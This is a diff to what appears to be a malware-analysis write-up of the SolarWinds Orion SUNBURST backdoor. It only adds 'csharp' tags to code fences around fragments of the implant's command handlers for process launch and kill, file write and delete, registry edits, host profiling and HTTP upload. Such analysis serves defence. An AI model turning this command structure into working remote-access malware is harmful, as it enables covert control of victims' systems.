@@ -108,6 +108,7 @@ Ky3WTU0sLtE1AgA= us-east-2
 
 **SolarWinds.Orion.Core.BusinessLayer.dll c2 structure**
 
+```csharp
 private enum JobEngine
 {
 	Idle,
@@ -134,7 +135,7 @@ private enum JobEngine
 
 SetTime (Set delay for http helper)
 
-```
+```csharp
 public static void SetTime(string[] args, out int delay)
 {
 	delay = int.Parse(args[0]);
@@ -144,7 +145,7 @@ public static void SetTime(string[] args, out int delay)
 
 CollectSystemDescription (get host info)
 
-```
+```csharp
 public static void CollectSystemDescription(string info, out string result)
 {
 	result = null;
@@ -173,7 +174,7 @@ public static void CollectSystemDescription(string info, out string result)
 
 UploadSystemDescription (Perform http request)
 
-```
+```csharp
 public static void UploadSystemDescription(string[] args, out string result, IWebProxy proxy)
 {
 	result = null;
@@ -299,7 +300,7 @@ public static void UploadSystemDescription(string[] args, out string result, IWe
 
 RunTask (Start a process)
 
-```
+```csharp
 public static int RunTask(string[] args, string cl, out string result)
 {
 	result = null;
@@ -326,7 +327,7 @@ public static int RunTask(string[] args, string cl, out string result)
 
 GetProcessByDescription (get processes info)
 
-```
+```csharp
 public static void GetProcessByDescription(string[] args, out string result)
 {
 	result = null;
@@ -370,7 +371,7 @@ public static void GetProcessByDescription(string[] args, out string result)
 
 KillTask (Kill a task by PID)
 
-```
+```csharp
 public static void KillTask(string[] args)
 {
 	Process.GetProcessById(int.Parse(args[0])).Kill();
@@ -380,7 +381,7 @@ public static void KillTask(string[] args)
 
 GetFileSystemEntries (Get files and folders by path)
 
-```
+```csharp
 public static void GetFileSystemEntries(string[] args, out string result)
 {
 	string searchPattern = (args.Length >= 2) ? args[1] : "*";
@@ -396,7 +397,7 @@ public static void GetFileSystemEntries(string[] args, out string result)
 
 WriteFile (Write to file)
 
-```
+```csharp
 public static void WriteFile(string[] args)
 {
 	string path = Environment.ExpandEnvironmentVariables(args[0]);
@@ -427,7 +428,7 @@ public static void WriteFile(string[] args)
 
 FileExists (Check if file exists)
 
-```
+```csharp
 public static void FileExists(string[] args, out string result)
 {
 	string path = Environment.ExpandEnvironmentVariables(args[0]);
@@ -439,7 +440,7 @@ public static void FileExists(string[] args, out string result)
 
 DeleteFile (delete file by path)
 
-```
+```csharp
 public static void DeleteFile(string[] args)
 {
 	File.Delete(Environment.ExpandEnvironmentVariables(args[0]));
@@ -449,7 +450,7 @@ public static void DeleteFile(string[] args)
 
 ReadRegistryValue (get a registry value)
 
-```
+```csharp
 public static int ReadRegistryValue(string[] args, out string result)
 {
 	result = OrionImprovementBusinessLayer.RegistryHelper.GetValue(args[0], args[1], null);
@@ -464,7 +465,7 @@ public static int ReadRegistryValue(string[] args, out string result)
 
 SetRegistryValue (modfiy a registry value)
 
-```
+```csharp
 public static int SetRegistryValue(string[] args)
 {
 	RegistryValueKind valueKind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), args[2]);
@@ -480,7 +481,7 @@ public static int SetRegistryValue(string[] args)
 
 SetRegistryValue (delete a registry value)
 
-```
+```csharp
 public static void DeleteRegistryValue(string[] args)
 {
 	OrionImprovementBusinessLayer.RegistryHelper.DeleteValue(args[0], args[1]);
@@ -489,7 +490,8 @@ public static void DeleteRegistryValue(string[] args)
 
 
 GetRegistrySubKeyAndValueNames (get all registry keys and values)
-```
+
+```csharp
 public static void GetRegistrySubKeyAndValueNames(string[] args, out string result)
 {
 	result = OrionImprovementBusinessLayer.RegistryHelper.GetSubKeyAndValueNames(args[0]);
